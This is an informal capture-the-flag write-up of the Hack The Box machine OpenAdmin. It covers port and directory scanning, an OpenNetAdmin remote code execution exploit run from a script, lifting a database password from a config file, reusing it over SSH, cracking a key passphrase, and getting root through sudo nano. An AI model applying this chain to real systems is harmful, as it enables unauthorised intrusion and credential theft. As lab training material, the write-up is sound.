---
featured_image: "/posts/Openadmin/openadmin.jpg"
title : HTB 16/20 OpenAdmin
published : true
date: 2021-04-25
author : PS
---
## Foothold
*nmap*
```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-28 19:26 EEST
Nmap scan report for 10.10.10.171
Host is up (0.081s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.30 seconds
```
![img](Pasted image 20210428192756.png)
Lulzzzzbuster Timeeeeeeeeeeeeeeeeee
```bash
[+] final settings

    > url:          http://10.10.10.171:80/
    > http method:  GET
    > http excodes: 400 404 500 501 502 503 
    > follow redir: 0
    > ua:           Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
    > con timeout:  10s
    > req timeout:  30s
    > threads:      30
    > con cache:    30
    > wordlist:     /usr/share/seclists/Discovery/Web-Content/common.txt
    > dns server:   1.1.1.1,8.8.8.8,208.67.222.222
    > logfile:      stderr
    > smart mode:   0

[+] game started

[+] code   size   real size   resp time   url

[*] 403 |  277B |      277B | 0.403072s | http://10.10.10.171:80/.htaccess
[*] 403 |  277B |      277B | 0.403872s | http://10.10.10.171:80/.htpasswd
[*] 403 |  277B |      277B | 0.470007s | http://10.10.10.171:80/.hta
[*] 301 |  314B |      314B | 0.170200s | http://10.10.10.171:80/artwork
[*] 200 |   11K |    10918B | 0.158344s | http://10.10.10.171:80/index.html
[*] 301 |  312B |      312B | 0.160989s | http://10.10.10.171:80/music
[*] 403 |  277B |      277B | 0.161605s | http://10.10.10.171:80/server-status
[*] 200 |   11K |    10918B | 1.497938s | http://10.10.10.171:80/

[+] game over
```
![img](Pasted image 20210428193228.png)
Clicking on the login button :
![img](Pasted image 20210428193246.png)
lolz :))  
![img](Pasted image 20210428193339.png)
Oh damn :))  
So vuln :))  
![img](Pasted image 20210428193537.png)
:)) sad  
```bash
>>> python3 ona-rce.py exploit http://10.10.10.171/ona/
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] Connected Successfully!
sh$ 
```
## User
In config/database_settings.inc.php we find some creds :
```bash
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
?>
```
PS only found a password but no user  
If we enumerate users using cat /etc/passwd we get 3 users root jimmy joanna  
After I tried each user, jimmy was a match :D
```bash
>>> ssh jimmy@10.10.10.171
The authenticity of host '10.10.10.171 (10.10.10.171)' can't be established.
ECDSA key fingerprint is SHA256:.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.171' (ECDSA) to the list of known hosts.
jimmy@10.10.10.171's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Apr 28 16:43:10 UTC 2021

  System load:  0.0               Processes:             113
  Usage of /:   49.3% of 7.81GB   Users logged in:       0
  Memory usage: 18%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.


Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
```
Well now PS needs to escalate to joanna sooo :
```bash
jimmy@openadmin:~$ ps -eaf --forest
UID        PID  PPID  C STIME TTY          TIME CMD
root         2     0  0 16:25 ?        00:00:00 [kthreadd]
root         4     2  0 16:25 ?        00:00:00  \_ [kworker/0:0H]
root         6     2  0 16:25 ?        00:00:00  \_ [mm_percpu_wq]
root         7     2  0 16:25 ?        00:00:00  \_ [ksoftirqd/0]
root         8     2  0 16:25 ?        00:00:00  \_ [rcu_sched]
root         9     2  0 16:25 ?        00:00:00  \_ [rcu_bh]
root        10     2  0 16:25 ?        00:00:00  \_ [migration/0]
root        11     2  0 16:25 ?        00:00:00  \_ [watchdog/0]
root        12     2  0 16:25 ?        00:00:00  \_ [cpuhp/0]
(part cut for sizee)
www-data  1392  1040  0 16:27 ?        00:00:00  \_ /usr/sbin/apache2 -k start
www-data  1786  1040  0 16:29 ?        00:00:00  \_ /usr/sbin/apache2 -k start
www-data  1899  1040  0 16:29 ?        00:00:00  \_ /usr/sbin/apache2 -k start
www-data  1900  1040  0 16:29 ?        00:00:00  \_ /usr/sbin/apache2 -k start
www-data  1903  1040  0 16:29 ?        00:00:00  \_ /usr/sbin/apache2 -k start
www-data  1906  1040  0 16:29 ?        00:00:00  \_ /usr/sbin/apache2 -k start
www-data  5456  1040  0 16:29 ?        00:00:00  \_ /usr/sbin/apache2 -k start
www-data  6130  1040  0 16:29 ?        00:00:00  \_ /usr/sbin/apache2 -k start
www-data  6162  1040  0 16:30 ?        00:00:00  \_ /usr/sbin/apache2 -k start
www-data  6209  1040  0 16:32 ?        00:00:00  \_ /usr/sbin/apache2 -k start
jimmy     6442     1  0 16:43 ?        00:00:00 /lib/systemd/systemd --user
jimmy     6444  6442  0 16:43 ?        00:00:00  \_ (sd-pam)
```
Always run  ps -eaf --forest because it may reveal something interesting,  
But after running  netstat -nalp
```bash
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0    360 10.10.10.171:22         10.10.14.7:55670        ESTABLISHED -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 10.10.10.171:80         10.10.14.7:42586        TIME_WAIT   -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -     
```
I see something on the  52846 port  
Run ```bash ssh jimmy@10.10.10.171 -L 80:127.0.0.1:52846```  
To listen for the port on your pc  
![img](Pasted image 20210428195234.png)  
Since we are talking about web apps , a good practice is to double check /var/www/ :
```bash
jimmy@openadmin:~$ cd /var/www
jimmy@openadmin:/var/www$ ls
html  internal  ona
jimmy@openadmin:/var/www$ cd internal/
jimmy@openadmin:/var/www/internal$ ls
index.php  logout.php  main.php
jimmy@openadmin:/var/www/internal$ 
```
Index.php reveals the password :
```bash
            $msg = '';
            if (isset($_POST['login'])
            && !empty($_POST['username'])
            && !empty($_POST['password']))
            {
              if ($_POST['username'] == 'jimmy'
              && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1')
              {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
```
that sha512 -> Revealed
So let's login
![img](Pasted image 20210428195713.png)
Hmm we need to decrypt the key now  
PS cracks it and get the password  bloodninjas  
Let's ssh with it  
and get user
## Root 
run sudo -l 
```bash 
joanna@openadmin:~$ sudo -l
    (ALL) NOPASSWD: /bin/nano /opt/priv
```
GTFObins time :
https://gtfobins.github.io/gtfobins/nano/
Annnnd run it and get root
PS out !
